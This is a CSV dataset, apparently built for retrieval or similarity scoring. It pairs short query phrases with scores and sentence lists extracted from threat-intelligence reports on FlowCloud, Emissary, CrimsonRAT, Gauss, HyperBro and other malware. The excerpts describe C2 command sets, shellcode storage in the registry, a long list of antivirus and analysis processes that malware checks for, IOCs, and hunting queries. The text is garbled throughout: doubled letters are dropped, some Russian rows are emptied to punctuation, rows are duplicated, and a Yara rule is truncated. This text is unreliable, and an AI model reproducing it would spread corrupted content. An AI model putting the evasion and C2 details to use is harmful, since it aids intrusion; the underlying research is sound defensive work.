300e6b26c0db1b946c785704b5df63cf,can exfiltrate files from local file systems.,0.763620031133953,"['Keyloging T13 Scren Capture FlowCloud takes screnshots at regular intervals.', 'FlowCloud uses OpenCV to take pictures using conected T125 Video Capture camera devices.', 'T123 Audio Capture FlowCloud has audio capture functionality.', 'FlowCloud automaticaly colects data based on timers and T19 Automated Colection events.', 'Data Staged: Local FlowCloud stores colected data in local SQLite databases T1074.01 Data Staging prior to exfiltration.', 'Data from Local T105 FlowCloud can exfiltrate files from local file systems.', 'System 25/26 Tactic ID Name Description Data from Removable T1025 FlowCloud can exfiltrate files from removable drives.', 'Media Archive Colected FlowCloud and LokBack use a staticaly linked zlib library to T1560.02Data: Archive via compres data.', 'Library Archive Colected FlowCloud compreses some colected data by removing T1560.03Data: Archive via duplicates and similar scren captures.', 'Custom Method Aplication Layer LokBack and FlowCloud can send and receive data over T1071.01Protocol: Web HTP.', 'Protocols Non-Aplication Layer T1095 LokBack can comunicate over raw TCP sockets.']"
300e6b26c0db1b946c785704b5df63cf,It is encrypted using the AES algorithm,0.783183682300416,"['18/26 The loader injects an orchestrator into memory in a svchost.exe proces.', 'In turn, the orchestrator injects the network component into memory and comunicates with it via a file located at C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\Log\\rsa.txt.', 'Figure 18 shows a sumary of the X4 components.', 'Figure 18.', 'Sumary of the X4 components The network component is shelcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.', 'Table 2 shows the thre registry keys used by X4.', 'Table 2.', 'Network shelcode registry keys Registry Key Description HKLM\\SOFTWARE\\Microsoft\\DRM\\X4Key AES key.', 'Name of the proces into which the shelcode wil be injected HKLM\\SOFTWARE\\Microsoft\\DRM\\PSKey (spolsv.exe).', 'HKLM\\SOFTWARE\\Microsoft\\DRM\\X4DataEncrypted shelcode.']"
300e6b26c0db1b946c785704b5df63cf,It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources,0.8725386620783355,"['FlowCloud v4.1.3 This older version of FlowCloud has already ben described in a Profpoint blogpost and presents similarities to the newer version described in the preceding subsections, so we wil only highlight notable diferences and new information revealed by our analysis.', 'This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the proces is being analyzed.', 'It checks runing proceses for executables of several known cybersecurity vendors.', 'While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses.', 'This tends to suport the proposition that versions 4 and 5 of FlowCloud are maintained in paralel.', 'It also embeds a DL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tol as one of its encrypted resources.', 'This library is loaded in memory and al of the anti-analysis/anti-sandboxing checks it implements are run.', 'Interestingly, the driver instaled is the same as the one for version 5.0.2.', 'Those used by version 5.0.3 provide identical functionality, but difer slightly.', 'TA410 LokingFrog LokingFrog uses two main malware families: X4 and LokBack.', 'We have sen both of them on machines belonging to the same victim.']"
300e6b26c0db1b946c785704b5df63cf,This includes bidirectional file transfers between the C&C and the compromised machine.,0.8092087101047497,"['It also creates an invisible window that listens for file creation, modification, or renaming events.', 'The coresponding files are colected unles they are excluded by that policy.', 'Another component colects information about maped volumes, including mount point, name, drive type, and disk usage data.', 'This same clas colects file and directory metadata.', 'As a complement to these automated measures, the backdor implements functions that provide ful aces and control over the content of mounted drives.', 'This includes bidirectional file transfers betwen the C&C and the compromised machine.', 'Programs and proceses FlowCloud is able to automaticaly obtain a list of instaled software through the use of the undocumented IShelApManager COM interface.', 'This functionality can also be invoked via a C&C comand.', 'Figure 14 shows, after the extraneous code has ben removed, how that interface is used.', '15/26 Figure 14.', 'Simplified code showing how the IShelApManager COM interface is used to list instaled aplications Other comands can be used to retrieve a detailed list of available services and curently runing proceses.']"
ee12d5a792452db61c3b55fba4783662,hostnames,0.8559501953703984,"[']com sites that redirected to credential harvesting pages hosted on *.frge[.]io.', 'These phishing links were also sent from email acounts that had ben compromised prior by the APT group.', ""On 16 March, the Computer Emergency Response Team of Ukraine (CERT- UA) isued an alert that further highlighted how UAC-028 (CERT-UA's name for FancyBear) was phishing UkrNet acounts, but this this time the APT group used the tinyurl[."", ']com URL-shortening service embeded inside a QR code the would lead to UkrNet credential havresting sites with *.frge[.', ']io and *.m.pipedream[.', ']net hostnames.', ""On 7 April, the Microsoft Threat Inteligence Center (MSTIC) and the Microsoft Digital Crimes Unit obtained a court order authorizing us to take control of seven internet domains Strontium (Microsoft's name for FancyBear) used to conduct phishing atacks against Ukrainian media organizations, as wel as government institutions and think tanks in the US and the EU involved in foreign policy."", ""On 27 April, Microsoft's Special Report on Ukraine revealed aditional details on Strontium's campaigns: In August 2021, Microsoft recorded Strontium targeting defense-related organizations in Ukraine."", 'htps:/blog.bushidotoken.net/202/06/overview-of-rusian-gru-and-svr.html 2/7 6/27/2, 3:46 PM Overview of Rusian GRU and SVR Cyberespionage Campaigns 1H 202 On 4 March, Microsoft specificaly noted that the network of the government of Vinytsia (a city in west-central Ukraine) was also compromised by Strontium and that sought aces via phishing to other Ukrainian military personel and regional Ukrainian government employe acounts.', 'In April, Microsoft observed Strontium and other suspected Rusian nation state threat actors launch campaigns against or expand on existing aces in the comunications sector, targeting the IT infrastructure that suports the sector, and a major internet service provider (ISP).', 'On 3 May, Gogle TAG provided an update on cyber activity in Eastern Europe.']"
6992b79cc67aff840006c4d45c436f3f,Download a file from the C2 server,0.8077305286210067,"['The Emisary Trojan wil use this GUID value provided by the C2 server as an encryption key that it wil use to encrypt data sent in subsequent network comunications.', 'Figure 8 C2 response to Emisary beacon The C2 server provides comands to the Trojan as a thre digit numeric string within the data portion of the HTP response (in the form of op=<comand>), which the Emisary Trojan wil decrypt and compare to a list of comands within its comand handler.', 'The comand handler function within the Emisary Trojan suports six comands, as sen in Table 2.', 'Comand Description 102 Upload a file to the C2 server.', '103 Executes a specified comand.', '104 Download file from the C2 server.', '105 Update configuration file.', '106 Create a remote shel.', '107 Updates the Trojan with a new executable.', 'Table 2 Comand handler within Emisary version 5.3 If the comand isued from the C2 server does not match the one listed in the Trojan saves the mesage unkown:%s to the log file.', 'The comand set available within Emisary alows the threat actors backdor aces to a compromised system.']"
6992b79cc67aff840006c4d45c436f3f,Download a file from the C2 server,0.8077305286210067,"['The Emisary Trojan wil use this GUID value provided by the C2 server as an encryption key that it wil use to encrypt data sent in subsequent network comunications.', 'Figure 8 C2 response to Emisary beacon The C2 server provides comands to the Trojan as a thre digit numeric string within the data portion of the HTP response (in the form of op=<comand>), which the Emisary Trojan wil decrypt and compare to a list of comands within its comand handler.', 'The comand handler function within the Emisary Trojan suports six comands, as sen in Table 2.', 'Comand Description 102 Upload a file to the C2 server.', '103 Executes a specified comand.', '104 Download file from the C2 server.', '105 Update configuration file.', '106 Create a remote shel.', '107 Updates the Trojan with a new executable.', 'Table 2 Comand handler within Emisary version 5.3 If the comand isued from the C2 server does not match the one listed in the Trojan saves the mesage unkown:%s to the log file.', 'The comand set available within Emisary alows the threat actors backdor aces to a compromised system.']"
78b11043fabe743b300b622ca68a8d5d,Download a file from the C2 server,0.8077305286210067,"['The Emisary DL wil skip to ofset 0x48 within this file and read the next 132 bytes, which it wil decrypt with a new algorithm as sen in the folowing: 1 SetFilePointer(h_config_file_1, 0x48, 0, 0); 2 ReadFile(h_config_file, bufer_for_config, 132u, &NumberOfBytesRead, 0); 3 CloseHandle(h_config_file); 4 srand(0xA03u); 5 iteration_count = 0; 6 do 7 *(bufer_for_config + iteration_count+) ^= rand() % 128; 8 while ( iteration_count < 0x84 ); The configuration structure has also changed as wel, with Emisary now using the folowing structure: 1 struct emisary_new_config { 2 WORD Emisary_version_major; 3 WORD Emisary_version_minor; 4 CHAR[36] GUID_for_sample; 5 WORD Unknown1; 6 CHAR[128] Server1; 7 CHAR[128] Server2; 8 CHAR[128] Server3; 9 CHAR[128] CampaignName; 10 CHAR[50] Unknown2; 1 WORD Delay_interval_seconds; 12 }; This version of Emisary also introduced a new comand handler that uses number-based comands instead of the GUID comands sen in prior versions of Emisary.', 'The functionality of the comands are the same, however, the comands themselves are invoked using a number.', 'Table 2 contains a list of available comands and a brief description of the functionality caried out by the comand.', 'Comand Description 102 Upload a file to the C2 server.', '103 Executes a specified comand.', '104 Download file from the C2 server.', '105 Update configuration file.', 'htp:/researchcenter.paloaltonetworks.com/2016/02/emisary-trojan-changelog-did-operation-lotus-blosom-cause-it-to-evolve/ 1/18 2016/10/31 Emisary Trojan Changelog: Did Operation Lotus Blosom Cause It to Evolve?', '- Palo Alto Networks Blog 106 Create a remote shel.', '107 Updates the Trojan with a new executable.', 'Table 2: New Emisary comand handler The network beacon sent from this version of Emisary is very similar to the beacon first introduced in Emisary version 2.0; however, the op value of 101 is hardcoded for the beacon and replaces the GUID based op designator to match the new comand handler.']"
78b11043fabe743b300b622ca68a8d5d,Download a file from the C2 server,0.8077305286210067,"['The Emisary DL wil skip to ofset 0x48 within this file and read the next 132 bytes, which it wil decrypt with a new algorithm as sen in the folowing: 1 SetFilePointer(h_config_file_1, 0x48, 0, 0); 2 ReadFile(h_config_file, bufer_for_config, 132u, &NumberOfBytesRead, 0); 3 CloseHandle(h_config_file); 4 srand(0xA03u); 5 iteration_count = 0; 6 do 7 *(bufer_for_config + iteration_count+) ^= rand() % 128; 8 while ( iteration_count < 0x84 ); The configuration structure has also changed as wel, with Emisary now using the folowing structure: 1 struct emisary_new_config { 2 WORD Emisary_version_major; 3 WORD Emisary_version_minor; 4 CHAR[36] GUID_for_sample; 5 WORD Unknown1; 6 CHAR[128] Server1; 7 CHAR[128] Server2; 8 CHAR[128] Server3; 9 CHAR[128] CampaignName; 10 CHAR[50] Unknown2; 1 WORD Delay_interval_seconds; 12 }; This version of Emisary also introduced a new comand handler that uses number-based comands instead of the GUID comands sen in prior versions of Emisary.', 'The functionality of the comands are the same, however, the comands themselves are invoked using a number.', 'Table 2 contains a list of available comands and a brief description of the functionality caried out by the comand.', 'Comand Description 102 Upload a file to the C2 server.', '103 Executes a specified comand.', '104 Download file from the C2 server.', '105 Update configuration file.', 'htp:/researchcenter.paloaltonetworks.com/2016/02/emisary-trojan-changelog-did-operation-lotus-blosom-cause-it-to-evolve/ 1/18 2016/10/31 Emisary Trojan Changelog: Did Operation Lotus Blosom Cause It to Evolve?', '- Palo Alto Networks Blog 106 Create a remote shel.', '107 Updates the Trojan with a new executable.', 'Table 2: New Emisary comand handler The network beacon sent from this version of Emisary is very similar to the beacon first introduced in Emisary version 2.0; however, the op value of 101 is hardcoded for the beacon and replaces the GUID based op designator to match the new comand handler.']"
30f8ba86fca0e0299ee2fcd334c285d8,Download a file from the C2 server,0.7548512832760031,"['8/21 Code Snipet: CrimsonRAT comand handler.', 'Sen in: Jan-Feb 202: Deployed by Kavach-themed downloaders.', 'Lightweight implant A new lightweight, .NET-based implant was also sen in this campaign in several infection chains.', 'This implant has limited capabilities when compared to CrimsonRAT but contains enough functionality to control and monitor the infected system.', 'Capabilities include: List al runing proceses on the endpoint.', 'Download and execute a file from the C2.', 'Download and execute a file specified by the C2 from another remote location.', 'Close conection with the C2 until the next run.', 'Gather system information from the endpoint such as Computer Name, username, public and local IPs, Operating system name, list of runings AVs, device type (desktop or laptop).', ""The implant also persists via an InternetShortcut in the curent user's Startup directory."", 'Implant downloading and executing a file from a remote location.']"
d62a6e941ec0167b0f3e15c72eb634ba,an encrypted configuration file,0.9089976844934868,"['It writes itself in files: and modifies the %system32%\\wbem\\wmiqry32.dl, %system32%\\wbem\\wmihlp32.dl system registry to be loaded instead of file.', '%system32%\\wbem\\wbemsvc.dl To achieve this, it writes the folowing registry value: [HKCR\\CLSID\\{7C857801-7381-1CF-84D-0A04B2E24}\\InProcServer32] Default = %system32%\\wbem\\wmihlp32.dl Operation The module is automaticaly loaded into proceses that use wbemsvc.dl.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading aditional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction lop.', 'Prior to comunicating with the C&C, al the information from the other modules log files is copied to the ~shw.tmp file.']"
31347d89b18461f35448b26fefb00133,cmd /C,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,cmd /C,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /C,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
edbc89697f1d79c07aa07ba6b14003d9,Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.,0.8742328496799324,"['The implants we observed in this campaign are shiped as DLs that ought to run in the context of exe, with the primary intent of reading a C2 adres from an encrypted configuration file stored in %WINDIR%\\debug\\netlogon.cfg and reaching out to the server to obtain a further payload.', 'Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has pased.', 'Mimikat_sp: a publicly available post-exploitation tol used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP adres and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdors image.', 'The IP and directory path tuple are used during execution for: Initialising comunications with the server; Sending information from the infected host; Requesting a specific server path containing a comand for execution and downloading it; Sending back the result of the comands execution to the C2 server.', 'The comands retrieved from the server are also encrypted with AES-128, with the key stored in the comands file itself.', 'Comand execution results are then encrypted using the same key.', 'We found the folowing list of suported comands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shel comand.', 'It is important to note that we could not conclusively tie most of those aditional pieces of malware to the intrusion set related to MonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCros, as outlined in the figure below.']"
a99756682df84005e8c419c7efe9ab57,Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdoor’s image.,0.8742328496799324,"['The implants we observed in this campaign are shiped as DLs that ought to run in the context of exe, with the primary intent of reading a C2 adres from an encrypted configuration file stored in %WINDIR%\\debug\\netlogon.cfg and reaching out to the server to obtain a further payload.', 'Interestingly, the Trojan holds a scheduling algorithm that would skip any work on Saturdays, checking the local time every hour to determine if Saturday has pased.', 'Mimikat_sp: a publicly available post-exploitation tol used to dump credentials and security secrets from exe, also used widely by various Chinese-speaking actors (e.g.', 'GhostEmperor, which we reported on).', 'Go implant: a formerly unknown backdor used to contact a C2 server using a RESTful API, where a combination of a hardcoded IP adres and a hypermedia directory path on the underlying server are used for information exchange.', 'Both the IP and the server directory path are encrypted with AES-128 using a base64 encoded key stored in the backdors image.', 'The IP and directory path tuple are used during execution for: Initialising comunications with the server; Sending information from the infected host; Requesting a specific server path containing a comand for execution and downloading it; Sending back the result of the comands execution to the C2 server.', 'The comands retrieved from the server are also encrypted with AES-128, with the key stored in the comands file itself.', 'Comand execution results are then encrypted using the same key.', 'We found the folowing list of suported comands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shel comand.', 'It is important to note that we could not conclusively tie most of those aditional pieces of malware to the intrusion set related to MonBounce, with the exception of Microcin, where some timeline artefacts coincide with other events related to ScrambleCros, as outlined in the figure below.']"
1b995ef87fe41bc1386885e2e9759548,Get content list from a specified directory,0.7713722892462587,"['Operations on this repository only existed in November 2021, and no other repositories were created after that.', 'Figure 238 Similar repositories asociated to github In related similar repositories, suspicious strings were found, which may be encrypted domain names or IPs.', '21/28 Figure 239 Suspicious strings in github Conect to the IP or domain name stored in the github repository.', 'Figure 2-40 socket conection Since the domain name, IP and github adres are al invalid, it is imposible to continue to folow up.', 'Through the static analysis of the sample, it is infered that after the atacker comunicates with the control terminal, there may be operations such as obtaining the list of files in the specified directory, starting the proces, and so on.', 'Get the list of files in the specified directory.', '2/28 Figure 241 File search related operations Create pipelines.', 'Figure 242 Create a pipeline Start the proces.', '23/28 Figure 243 Start proces 03 Atribution Analysis In the previous observations, it was found that some CNC organization personel would integrate vcpkg in the development environment.', 'This feature also exists in the samples discovered this time, and the path is also consistent with the path used in the past.', 'Figure 31 Path information in this atack 24/28 Figure 32 Path information in past atacks Part of the code in the sample is also very similar.']"
564c219dc0a2c3edd2eed08025387d9d,Gathering system information,1.0000000000000002,"['EPICENTER RAT Enumerate, launch and kil proceses.', 'Epicenter is a comodity RAT used by SideCopy since Take screnshots.', '2018.', 'It contains a variety of capabilities (Figure 21) Enumerate directories, delete files and folders.', 'including: Check persistence status for self.', 'Gathering system information.', 'Gather instaled Antivirus product names.', 'PLUGIN ANALYSIS Shutdown, rebot system or log the user of.', 'Block keyboard and mouse inputs to self.', 'FILES MANAGER Uninstal self.', 'The files manager plugin used can scan al drives on the system recursively and record file paths to a log file named 2021 Cisco.']"
aa3c3157a2336623d96a7e2fa57fec02,Gathering system information,0.8851157749731283,"['5 1.1 Context .', '5 1.2 Objectives .', '5 1.3 Authors .', '5 1.4 Ethical choices .', '5 1.5 Document structure .', '5 2 Information gathering .', '6 2.1 Comand & Control scaner .', '6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .']"
aa3c3157a2336623d96a7e2fa57fec02,Gathering system information,0.8851157749731283,"['5 1.1 Context .', '5 1.2 Objectives .', '5 1.3 Authors .', '5 1.4 Ethical choices .', '5 1.5 Document structure .', '5 2 Information gathering .', '6 2.1 Comand & Control scaner .', '6 2.2 IP ranges .', '7 2.3 Working hours .', '7 3 Poison Ivy .', '8 3.1 Description .']"
cf257e6c27074e5b0154ddaa7a016f66,Gathering system information,0.7525366971538254,"['WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', 'htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 1/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 12/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets WinMain() snipet showing antivirus proces detection.', ""The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 13/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?id="" to C2 and receive the response.', 'The received response is a remote file saved into the ""debug"" folder and executed with the API ""ShelExecuteA"".', 'In our research debuging environment, the remote file is similar to the trojan.', 'htps:/blog.talosinteligence.com/202/05/biter-apt-ads-bangladesh-to-their.html 14/20 5/19/2, 12:15 PM Cisco Talos Inteligence Group - Comprehensive Threat Inteligence: Biter APT ads Bangladesh to their targets Requests making function 1 at ofset 0401E0.']"
fcef139433bae54ea996aa09f7e1fcf4,Gathering system information,0.7525366971538254,"['WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?', 'id="" to C2 and receive the response.', 'The received response is a remote file saved into the ""debug"" folder and executed with the API ""ShelExecuteA"".', 'In our research debuging environment, the remote file is similar to the trojan.']"
7856ebf4259ae125d28e1268047ceb06,System Information,1.0,"['impactful users, based on the level of risk to the frequently triger investigations by security security violation or a potential security violation.', 'organization if they become compromised.', 'operations/analysts.', 'authorization atack surface A proces of determining whether a subject is botnet analyst An information systems characteristics that permit alowed to have the specified types of aces to a A colection of computers compromised by Also known as cybersecurity analyst, a comon role an adversary to probe, atack, or maintain presence particular resource.', 'This action is typicaly done by malicious code and controled acros a network.', 'within an organizations SOC team that investigates, in the information system.', 'evaluating aplicable aces control information alerts, or hunts for adversary activities.', 'such as aces control lists.', 'In modern cybersecurity aproaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat inteligence.', 'Microsoft Digital Defense Report | September 2020 83 TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSARY breach ciphertext data estate encryption Any incident that results in unauthorized aces of Data or information in its encrypted form used The procedures, services, and infrastructure used to The proces of transforming plaintext into data, aplications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes refered manage corporate data in the digital estate.']"
ead0fda2e6cad3ae5192122cc05e6c49,Decoding Function,0.7751180248022331,"[': 028-9-792-260 oder cyberabwehr@bfv.bund.de Bundesamt fr Verfasungschutz - Cyber-Brief Nr.', '01/202 8 TLP:WHITE BfV Cyber-Brief Anhang A.', 'Indicators of Compromise (IOCs) Typ IOC Funktion IP 104.168.236.46 C2-Server IP 103.79.7.20 C2-Server IP 87.98.190.184 C2-Server Weitere mgliche Indikatoren fr eine Infektion Die folgenden Indikatoren knten auch einen legitimen Ursprung haben, solten aber denoch ein- gehend geprft werden: Log-Datei mit Tastaturanschlgen (vom Datei %TEMP%\\<username>.key.log Keyloger aufgezeichnet) Datei %TEMP%\\<username>.clip.log Log-Datei mit Inhalt der Zwischenablage Named Pipe fr IPC zwischen Daemon Named Pipe \\.\\pipe\\testpipe Prozes und Worker Prozes Mutex die vom Program erstelt wird Mutex 80A853-1E05-4323-B4F9-43A4396A4507 um Mehrfachausfhrung zu verhindern Wird angelegt wen Schadsoftware mit Admin-Rechten ausgefhrt wird Service windefenders Anzeigename Windows Defenders Beschreibung Windows Defenders Service Optional weitere Injection in msiexec Prozes msiexec.exe durch entsprechendes C2-Komando ausgelst Mozila/5.0 (Windows NT 6.3; WOW64) ApleWebKit/537.36 User Agent String den die Malware User Agent (KHTML, like Gecko) Chrome/34.0.1847.16 Safari/537.36 fr C2 (htps) verwendet Pfad auf dem C2-Server an den Remote Pfad /api/v2/ajax POST-Requests bertragen werden HKEY_CURENT_USER\\Software\\Microsoft\\Windows\\ Run Key als Persistenzmechanismus bei Aus- Registry CurentVersion\\Run\\windefenders fhrung ohne Admin-Rechte %ProgramFiles%\\Comon Files\\windefenders\\ %ProgramFiles%\\Comon Files\\windefenders\\config.ini %ProgramFiles%\\Comon Files\\windefenders\\msmpeng.exe %ProgramFiles%\\Comon Files\\windefenders\\thumb.dat %ProgramFiles%\\Comon Files\\windefenders\\vftrace.dl Dateien / Ablageorte und Komponenten der Malware Pfade %ProgramData%\\windefenders\\ %ProgramData%\\windefenders\\config.ini %ProgramData%\\windefenders\\msmpeng.exe %ProgramData%\\windefenders\\thumb.dat %ProgramData%\\windefenders\\vftrace.dl Bundesamt fr Verfasungschutz - Cyber-Brief Nr.', '01/202 9 TLP:WHITE BfV Cyber-Brief Anhang B. Detektionsregeln -HYPERBRO (Yara) Detektionsregel I: Stage-Loader Anmerkung: Die nachfolgende Yara-Regel dient zur Identifikation des initialen Stage-Loaders aus der Datei vftra- ce.dl der HYPERBRO Malware und detektiert die entsprechende Dekodier-Funktion.', 'import pe rule vftrace_loader { meta: id = 4eEDO8F3p27FeY5YLIPjrA fingerprint = 